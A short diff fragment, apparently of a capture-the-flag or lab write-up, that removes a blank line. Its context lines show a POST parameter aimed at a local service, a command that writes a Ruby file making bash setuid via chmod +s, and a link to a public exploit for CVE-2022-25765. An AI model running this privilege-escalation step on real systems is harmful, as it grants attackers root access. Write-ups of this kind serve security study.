@@ -30,7 +30,6 @@ POST parameter = url the URL needs to be http://$IP:3000/pdf
 echo 'system("chmod +s /usr/bin/bash")' > app.rb
 ```
 
-
 ### References
 
 - https://github.com/UNICORDev/exploit-CVE-2022-25765
